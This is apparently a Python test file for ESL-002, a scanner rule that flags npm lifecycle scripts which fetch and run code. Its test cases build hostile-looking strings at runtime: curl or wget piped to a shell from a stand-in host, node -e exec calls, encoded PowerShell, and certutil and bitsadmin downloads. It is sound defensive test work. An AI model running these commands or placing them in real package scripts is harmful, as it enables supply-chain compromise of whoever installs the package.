"""ESL-002 npm-install-script-exec: lifecycle scripts in package.json.

Every malicious-looking script is assembled from tokens at test runtime, so no
committed file contains a literal the shipped rules match (see the repo guard in
test_esl003). Hosts are ``example.invalid``; nothing here is ever executed.
"""

from __future__ import annotations

import json
import time
from pathlib import Path

import jsonschema
import pytest
import yara
from builders import TarItem, make_tar

import eslabon.cli as cli
import eslabon.scan as scan
from eslabon import archive, npm_scripts, yara_engine
from eslabon.model import Limits, LimitsExceeded, Member, PackageRef, ScanContext
from eslabon.sanitize import to_hex

SCHEMA = json.loads(
    (Path(__file__).parent.parent / "schema" / "event.schema.json").read_text("utf-8")
)
NL = chr(10)
BS = chr(0x5C)
CURL = "cu" + "rl"
WGET = "wg" + "et"
EVIL = "https" + "://example.invalid/stage2"
REPO_URL = "git+https" + "://github.com/x/y.git"
HOME_URL = "https" + "://github.com/x/y#readme"
NODE_E = "node" + " -e"
PIPE_SH = "| " + "sh"
PS = "power" + "shell"


def _pkg_json(lifecycle: dict | None = None, **extra) -> bytes:
    doc: dict = {"name": "demo", "version": "1.0.0", "description": "demo package"}
    doc.update(extra)
    if lifecycle is not None:
        doc["scripts"] = lifecycle
    doc.setdefault("repository", {"type": "git", "url": REPO_URL})
    doc.setdefault("homepage", HOME_URL)
    return json.dumps(doc, indent=2).encode("utf-8")


def _ctx(kind: str = "npm") -> ScanContext:
    eco = "npm" if kind == "npm" else "pypi"
    pkg = PackageRef("demo", "1.0.0", eco, "")
    return ScanContext(rules=None, limits=Limits(), pkg=pkg, archive_kind=kind)


def _scan(data: bytes, raw: str = "package/package.json", kind: str = "npm", ctx=None):
    ctx = ctx or _ctx(kind)
    path = archive.normalize_path(raw, "npm")[0]
    m = Member(index=1, path=path, data=data, raw_path=raw)
    return npm_scripts.scan_package_json(m, ctx), ctx


def _ids(data: bytes, **kw) -> list[str]:
    return [f.rule_id for f in _scan(data, **kw)[0]]


# ------------------------------------------------------------ the brief ----


def test_postinstall_curl_pipe_sh_fires():
    script = CURL + " -sSL " + EVIL + " " + PIPE_SH
    data = _pkg_json({"test": "jest", "postinstall": script})
    found, ctx = _scan(data)
    assert [f.rule_id for f in found] == ["ESL-002"]
    f = found[0]
    assert f.file == "package.json"
    assert f.member_index == 1
    assert f.name_hex == to_hex("package/package.json")
    key_line = data.decode().splitlines().index(
        '    "postinstall": ' + json.dumps(script)
    )
    assert f.line == key_line + 1
    assert f.snippet == script
    assert f.match_count == 3  # the tool, the URL and the pipe
    assert ctx.anomalies == []


def test_preinstall_node_eval_fires():
    script = NODE_E + " \"require('child_process').exec('id')\""
    assert _ids(_pkg_json({"preinstall": script})) == ["ESL-002"]


def test_node_install_js_silent():
    # esbuild / sharp / puppeteer shape: running a local file is out of scope
    assert _ids(_pkg_json({"postinstall": "node install.js"})) == []


def test_node_gyp_rebuild_silent():
    assert _ids(_pkg_json({"install": "node-gyp rebuild"})) == []


def test_husky_install_silent():
    assert _ids(_pkg_json({"postinstall": "husky install"})) == []


@pytest.mark.parametrize(
    "data",
    [
        b"{not json",
        b"[1, 2, 3]",
        b'"just a string"',
        b"",
        b"\xff\xfe{}",
        b"[" * 100_000 + b"]" * 100_000,
    ],
    ids=["syntax", "array", "string", "empty", "not-utf8", "deep"],
)
def test_malformed_package_json_is_anomaly_not_crash(data):
    found, ctx = _scan(data)
    assert found == []
    assert [a.kind for a in ctx.anomalies] == ["bad_package_json"]
    a = ctx.anomalies[0]
    assert a.path_hex == to_hex("package/package.json")
    assert "bad_package_json" not in scan.INCOMPLETE_KINDS


# ---------------------------------------------------------- more shapes ----


@pytest.mark.parametrize(
    "script",
    [
        WGET + " -q -O- " + "example.invalid/x " + PIPE_SH,
        CURL.upper() + " -o x.exe example.invalid",
        "/usr/bin/" + CURL + " -s example.invalid -o /tmp/x",
        "$(" + CURL + " -s example.invalid)",
        "cat x " + "| ba" + "sh",
        "cat x |" + "/bin/sh",
        "cat x | sudo " + "bash -s",
        "type x | " + "cmd",
        "echo x | " + "pw" + "sh -",
        NODE_E + "\"require('./x')+1\"",
        "node --input-type=module " + "--eval \"import('x')\"",
        "node -" + "pe \"process.version\"",
        "NODE.EXE -" + "E \"x\"",
        PS + " -NoP -ExecutionPolicy Bypass -" + "enc SQBFAFgA",
        PS + ".exe /" + "EncodedCommand SQBFAFgA",
        "pw" + "sh -" + "e SQBFAFgA",
        PS + " -c \"" + "iw" + "r example.invalid\"",
        "certutil" + " -urlcache -split -f x y",
        "bitsadmin" + " /transfer j x y",
        "Invoke-" + "WebRequest x",
        "echo see " + EVIL,
        "node install.js && " + CURL + " x",
    ],
)
def test_other_shapes_fire(script):
    assert _ids(_pkg_json({"install": script})) == ["ESL-002"]


@pytest.mark.parametrize(
    "script",
    [
        "node install.js",
        "node install.mjs",
        "node-gyp rebuild",
        "husky install",
        "prebuild-install || node-gyp rebuild",
        "prebuild-install -r napi || node-gyp rebuild",
        "node-pre-gyp install --fallback-to-build",
        "node scripts/postinstall.js",
        "node scripts/" + CURL + ".js",
        "node-" + CURL + " --version",
        "patch-package",
        "opencollective-postinstall",
        "opencollective-postinstall || exit 0",
        'echo "thanks for installing"',
        "npx only-allow pnpm",
        "node bin/postinstall || exit 0",
        "build.sh || " + "sh fallback.sh",
        "node index.js --exec install",
        # core-js: node -e that only requires a local file is "node file.js"
        NODE_E + " \"try{require('./postinstall')}catch(e){}\"",
        NODE_E + " \"require('./scripts/check.js')\"",
        "node build.js --env production",
        PS + " -File install.ps1",
        PS + " -ExecutionPolicy Bypass -File install.ps1",
        "node x.js -" + "enc y",
    ],
)
def test_benign_scripts_silent(script):
    assert _ids(_pkg_json({"preinstall": script})) == []


def test_url_only_in_repository_or_homepage_silent():
    data = _pkg_json({"postinstall": "node install.js", "build": CURL + " " + EVIL})
    assert REPO_URL.encode() in data and HOME_URL.encode() in data
    found, ctx = _scan(data)
    assert found == [] and ctx.anomalies == []


def test_other_script_names_silent():
    data = _pkg_json({"prepare": CURL + " " + EVIL + " " + PIPE_SH, "test": NODE_E})
    assert _ids(data) == []


@pytest.mark.parametrize(
    "scripts", [{"postinstall": [CURL, EVIL]}, {"install": 1}, {"preinstall": None}]
)
def test_non_string_script_silent(scripts):
    found, ctx = _scan(_pkg_json(scripts))
    assert found == [] and ctx.anomalies == []


def test_scripts_not_a_dict_silent():
    found, ctx = _scan(_pkg_json(None, scripts=CURL + " " + EVIL))
    assert found == [] and ctx.anomalies == []


def test_bom_package_json_still_parsed():
    data = b"\xef\xbb\xbf" + _pkg_json({"postinstall": CURL + " x"})
    assert _ids(data) == ["ESL-002"]


def test_huge_integer_does_not_hide_the_script():
    # Python refuses int strings over 4300 digits; JSON.parse does not.
    data = _pkg_json({"postinstall": CURL + " x"})
    data = data[:-1] + b', "n": ' + b"9" * 5000 + b"}"
    found, ctx = _scan(data)
    assert [f.rule_id for f in found] == ["ESL-002"]
    assert ctx.anomalies == []


def test_duplicate_keys_last_wins_like_json_parse():
    data = (
        '{"name":"d","version":"1","scripts":{"postinstall":"'
        + CURL
        + ' x","postinstall":"node install.js"}}'
    ).encode()
    assert _ids(data) == []
    data = (
        '{"scripts":{"postinstall":"node install.js",'
        + NL
        + '"postinstall":"'
        + CURL
        + ' x"}}'
    ).encode()
    found, _ = _scan(data)
    assert [f.line for f in found] == [2]  # the key that is in effect


def test_unicode_escaped_script_is_decoded():
    escaped = "".join(f"{BS}u{ord(c):04x}" for c in CURL)
    data = ('{"scripts":{"install":"' + escaped + ' x"}}').encode()
    found, _ = _scan(data)
    assert [f.rule_id for f in found] == ["ESL-002"]
    assert found[0].snippet == CURL + " x"


def test_lone_surrogate_in_script_no_crash():
    data = ('{"scripts":{"install":"' + BS + "ud800 " + CURL + ' x"}}').encode()
    assert _ids(data) == ["ESL-002"]


def test_several_scripts_one_finding():
    data = _pkg_json(
        {"preinstall": "node install.js", "install": NODE_E + " x", "postinstall": EVIL}
    )
    found, _ = _scan(data)
    assert len(found) == 1
    f = found[0]
    assert f.match_count == 2
    lines = data.decode().splitlines()
    assert lines[f.line - 1].strip().startswith('"install"')
    assert f.snippet == NODE_E + " x"


def test_escape_sequences_in_snippet_are_cleaned():
    script = CURL + " x" + chr(0x1B) + "[31m" + NL + "y"
    found, _ = _scan(_pkg_json({"install": script}))
    assert chr(0x1B) not in found[0].snippet and NL not in found[0].snippet


# ------------------------------------------------------------- paths ----


@pytest.mark.parametrize(
    "raw",
    [
        "package/package.json",
        "anything/package.json",
        "package" + BS + "package.json",
        "package/PACKAGE.JSON",
        "package/x/../package.json",
        "../package/package.json",
        "package/package.json" + chr(0),
    ],
)
def test_package_json_readings_scanned(raw):
    assert _ids(_pkg_json({"postinstall": CURL + " x"}), raw=raw) == ["ESL-002"]


@pytest.mark.parametrize(
    "raw",
    ["package.json", "package/lib/package.json", "package/node_modules/a/package.json"],
)
def test_other_package_json_silent(raw):
    assert _ids(_pkg_json({"postinstall": CURL + " x"}), raw=raw) == []


@pytest.mark.parametrize("kind", ["sdist", "wheel", ""])
def test_not_npm_silent(kind):
    data = _pkg_json({"postinstall": CURL + " x"})
    assert _ids(data, kind=kind) == []
    assert _ids(b"{bad", kind=kind) == []


# ------------------------------------------------- engine separation ----


def test_esl002_not_in_member_rules():
    # esl002 matches any URL; it only runs on script strings, never on members.
    rules = yara_engine.compile_rules()
    assert {r.identifier.split("_")[0] for r in rules} == {"esl001", "esl003"}
    script_rules = yara_engine.compile_script_rules()
    assert {r.identifier.split("_")[0] for r in script_rules} == {"esl002"}
    assert all(r.meta["esl_id"] == "ESL-002" for r in script_rules)
    data = _pkg_json({"postinstall": CURL + " " + EVIL + " " + PIPE_SH})
    m = Member(index=0, path="package.json", data=data, raw_path="package/package.json")
    ctx = ScanContext(rules=rules, limits=Limits(), pkg=_ctx().pkg, archive_kind="npm")
    assert yara_engine.scan_member(m, ctx) == []


def test_registered_at_import():
    assert npm_scripts.scan_package_json in scan.ANALYZERS


def test_yara_timeout_becomes_limits_exceeded(monkeypatch):
    class _Slow:
        def match(self, **kw):
            raise yara.TimeoutError("slow")

    monkeypatch.setattr(npm_scripts, "_script_rules", lambda: _Slow())
    with pytest.raises(LimitsExceeded):
        _scan(_pkg_json({"postinstall": "x"}))


# --------------------------------------------------------- performance ----


@pytest.mark.parametrize(
    "unit",
    [
        "| ",
        "|/" + "a" * 39,
        "node -x ",
        "node " + "-" * 50 + " ",
        PS + " a ",
        PS + "  ",
        PS + " -x ",
        "pw" + "sh -" + "e ",
        PS + " " + "a" * 41,
        "x " + CURL + "x",
        "http:/",
        "https" + "://",
        "node " + " " * 9,
    ],
)
def test_ten_mib_newline_free_script_is_fast(unit):
    script = unit * (10 * 2**20 // len(unit))
    data = json.dumps({"scripts": {"postinstall": script}}).encode("ascii")
    ctx = ScanContext(
        rules=None, limits=Limits(yara_timeout_s=10), pkg=_ctx().pkg, archive_kind="npm"
    )
    start = time.perf_counter()
    found, _ = _scan(data, ctx=ctx)
    elapsed = time.perf_counter() - start
    print(f"10 MiB of {unit[:20]!r}: {elapsed:.2f} s")
    assert elapsed < 6.0
    assert all(f.rule_id == "ESL-002" for f in found)


# ------------------------------------------------------------- end to end ----


def _cli(items: list[TarItem], tmp_path: Path) -> tuple[int, list[dict]]:
    target = tmp_path / "demo-1.0.0.tgz"
    target.write_bytes(make_tar(items))
    out = tmp_path / "out" / "e.jsonl"
    code = cli.main(["scan", str(target), "--out", str(out), "--ecosystem", "npm"])
    events = [json.loads(x) for x in out.read_text("ascii").splitlines()]
    for ev in events:
        jsonschema.validate(ev, SCHEMA)
    return code, events


def test_cli_end_to_end_postinstall(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    data = _pkg_json({"postinstall": CURL + " -sSL " + EVIL + " " + PIPE_SH})
    code, events = _cli(
        [
            TarItem("package/package.json", data),
            TarItem("package/index.js", b"module.exports = 1;\n"),
        ],
        tmp_path,
    )
    assert code == 1
    findings = [e for e in events if e["event"]["dataset"] == "eslabon.finding"]
    assert [e["rule"]["id"] for e in findings] == ["ESL-002"]
    ev = findings[0]["eslabon"]["evidence"]
    assert ev["file"] == "package.json"
    summary = [e for e in events if e["event"]["dataset"] == "eslabon.scan"][0]
    assert summary["package"]["name"] == "demo"


def test_cli_malformed_package_json_anomaly(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    code, events = _cli([TarItem("package/package.json", b"{oops")], tmp_path)
    summary = [e for e in events if e["event"]["dataset"] == "eslabon.scan"][0]
    assert "bad_package_json" in summary["eslabon"]["scan"]["anomaly_kinds"]
    assert summary["eslabon"]["scan"]["status"] == "ok"
    assert code == 0
